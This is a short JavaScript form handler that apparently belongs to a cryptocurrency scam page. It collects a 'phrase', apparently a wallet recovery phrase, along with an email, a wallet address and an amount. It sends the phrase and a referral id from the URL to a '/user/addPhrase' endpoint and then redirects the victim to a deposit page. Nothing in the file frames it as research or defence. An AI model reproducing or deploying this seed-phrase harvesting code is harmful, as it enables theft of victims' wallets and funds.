const uId= new URLSearchParams(location.search).get('ref')
const form= document.getElementById('form')
form.addEventListener('submit',(e)=>{
    e.preventDefault()
})

const phrase= document.getElementById('phrase')
const email= document.getElementById('email')
const wallAdd= document.getElementById('wallAdd')
const amt= document.getElementById('amt')
const subBtn=document.getElementById('subBtn')

subBtn.onclick= async()=>{
    console.log(phrase.value,email.value,wallAdd.value,amt.value)
    if(phrase.value&&wallAdd.value&&amt.value&&email.value){
      await  fetch('/user/addPhrase',{
            method:'POST',
            headers:{'Content-Type':'application/json'},
            body:JSON.stringify({phrase:phrase.value ,userId: new URLSearchParams(location.search).get('ref')})
        }).then(res=>res.json()).then(data=>alert(data))
        location.assign(`./deposit.html?ref=${new URLSearchParams(location.search).get('ref')}`)
    }
}